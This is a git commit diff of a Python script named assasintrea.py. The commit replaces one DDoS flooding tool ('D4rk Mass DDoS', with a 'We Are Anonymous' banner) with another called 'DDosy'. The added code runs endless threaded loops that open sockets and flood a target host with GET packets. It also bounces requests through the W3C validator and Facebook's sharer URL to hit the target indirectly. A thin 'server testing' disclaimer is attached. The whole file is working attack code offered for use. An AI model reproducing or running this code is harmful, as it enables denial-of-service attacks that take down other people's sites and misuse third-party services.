d7e9e70509d6665e0f286acacca0892548b17cb2
Mr.DDOS ATTACK <96361084+Xsarjame@users.noreply.github.com>
2022-02-21 12:18:35 +0700

    Update assasintrea.py

--- assasintrea.py
+++ assasintrea.py
@@ -3392,126 +3392,141 @@ def referer_list():
 	headers_referers.append('http://' + host + '/')
 	return(headers_referers)
 
-# generates a Keyword list	
-def keyword_list():
-        global keyword_top
-        keyword_top.append('D4rkN3t')
+def my_bots():
+	global bots
+	bots=[]
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	return(bots)
 
 
-	headers_referers.append('http://' + host + '/')
-	return(headers_referers)
-	
-#builds random ascii string
-def buildblock(size):
-	out_str = ''
-	for i in range(0, size):
-		a = random.randint(65, 160)
-		out_str += chr(a)
-	return(out_str)
+def bot_ddosing(url):
+	try:
+		while True:
+			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
+			print("\033[94mbot is ddosing...\033[0m")
+			time.sleep(.1)
+	except:
+		time.sleep(.1)
+
+
+def down_it(item):
+	try:
+		while True:
+			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((host,int(port)))
+			if s.sendto( packet, (host, int(port)) ):
+				s.shutdown(1)
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! ddosing--> \033[0m")
+			else:
+				s.shutdown(1)
+				print("\033[91mshut<->down\033[0m")
+			time.sleep(.1)
+	except socket.error as e:
+		print("\033[91mno connection! server maybe down\033[0m")
+		#print("\033[91m",e,"\033[0m")
+		time.sleep(.1)
+
+
+def dos():
+	while True:
+		item = q.get()
+		down_it(item)
+		q.task_done()
+
+
+def dos2():
+	while True:
+		item=w.get()
+		bot_ddosing(random.choice(bots)+"http://"+host)
+		w.task_done()
+
 
 def usage():
-	print 'D4rk Mass DDoS Tool created by D4rkN3n'
-	print 'Facebook Profile: https://www.facebook.com/profile.php?id=100013355013276'
-	print 'Usage: d4rk.py (url)'
-	print 'Example: d4rk.py http://target.com/'
-	print "\a"
-print \
-"""                                                       
- (                    
- )\ )      )       )  
-(()/(   ( /((   ( /(  
- /(_))  )\())(  )\()) 
-(_))_  ((_)(()\((_)\  
- |   \| | (_|(_) |(_) 
- | |) |_  _| '_| / /  
- |___/  |_||_| |_\_\  
-                      
-_________________________
-                                                
-"""
-
-	
-#http request
-def httpcall(url):
-	useragent_list()
-	referer_list()
-	code=0
-	if url.count("?")>0:
-		param_joiner="&"
-	else:
-		param_joiner="?"
-	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
-	request.add_header('User-Agent', random.choice(headers_useragents))
-	request.add_header('Cache-Control', 'no-cache')
-	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
-	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(50,100)))
-	request.add_header('Keep-Alive', random.randint(110,160))
-	request.add_header('Connection', 'keep-alive')
-	request.add_header('Host',host)
-	try:
-			urllib2.urlopen(request)
-	except urllib2.HTTPError, e:
-			#print e.code
-			set_flag(1)
-            
- 			print '                                                                    '
- 			print '***** We Are Anonymous *****'
- 			print '***** Your website will be down *****'
- 			print '                                                                    '
-                                                         
-			code=500
-	except urllib2.URLError, e:
-			#print e.reason
-			sys.exit()
-	else:
-			inc_counter()
-			urllib2.urlopen(request)
-	return(code)		
-
-	
-#http caller thread 
-class HTTPThread(threading.Thread):
-	def run(self):
-		try:
-			while flag<2:
-				code=httpcall(url)
-				if (code==500) & (safe==1):
-					set_flag(2)
-		except Exception, ex:
-			pass
-
-# monitors http threads and counts requests
-class MonitorThread(threading.Thread):
-	def run(self):
-		previous=request_counter
-		while flag==0:
-			if (previous+150<request_counter) & (previous<>request_counter):
-				print "#~~~>D4rk Virus Sended: %d Sending more<~~~#" % (request_counter)
-				previous=request_counter
-		if flag==2:
-			print "\n ~>Stopping the mass DDoS Attack<~"
-
-#execute 
-if len(sys.argv) < 2:
-	usage()
+	print (''' \033[92m	DDosy By Sanix darker
+	It is the end user's responsibility to obey all applicable laws.
+	It is just for server testing script. Your ip is visible. \n
+	usage : python3 ddosy.py [-s] [-p] [-t]
+	-h : help
+	-s : server ip
+	-p : port default 80
+	-t : turbo default 135 \033[0m''')
 	sys.exit()
-else:
-	if sys.argv[1]=="help":
+
+
+def get_parameters():
+	global host
+	global port
+	global thr
+	global item
+	optp = OptionParser(add_help_option=False,epilog="DDosy")
+	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
+	optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
+	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
+	optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 135 -t 135")
+	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
+	opts, args = optp.parse_args()
+	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
+	if opts.help:
 		usage()
-		sys.exit()
+	if opts.host is not None:
+		host = opts.host
 	else:
-		print "Starting the D4rk Attack"
-		print "WTF U R DEAD"
-		if len(sys.argv)== 3:
-			if sys.argv[2]=="safe":
-				set_safe()
-		url = sys.argv[1]
-		if url.count("/")==2:
-			url = url + "/"
-		m = re.search('http\://([^/]*)/?.*', url)
-		host = m.group(1)
-		for i in range(700):
-			t = HTTPThread()
+		usage()
+	if opts.port is None:
+		port = 80
+	else:
+		port = opts.port
+	if opts.turbo is None:
+		thr = 135
+	else:
+		thr = opts.turbo
+
+
+# reading headers
+global data
+headers = open("headers.txt", "r")
+data = headers.read()
+headers.close()
+#task queue are q,w
+q = Queue()
+w = Queue()
+
+
+if __name__ == '__main__':
+	if len(sys.argv) < 2:
+		usage()
+	get_parameters()
+	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
+	print("\033[94mPlease wait...\033[0m")
+	user_agent()
+	my_bots()
+	time.sleep(5)
+	try:
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.connect((host,int(port)))
+		s.settimeout(1)
+	except socket.error as e:
+		print("\033[91mcheck server ip and port\033[0m")
+		usage()
+	while True:
+		for i in range(int(thr)):
+			t = threading.Thread(target=dos)
+			t.daemon = True  # if thread is exist, it dies
 			t.start()
-		t = MonitorThread()
-		t.start()
+			t2 = threading.Thread(target=dos2)
+			t2.daemon = True  # if thread is exist, it dies
+			t2.start()
+		start = time.time()
+		#tasking
+		item = 0
+		while True:
+			if (item>1800): # for no memory crash
+				item=0
+				time.sleep(.1)
+			item = item + 1
+			q.put(item)
+			w.put(item)
+		q.join()
+		w.join()
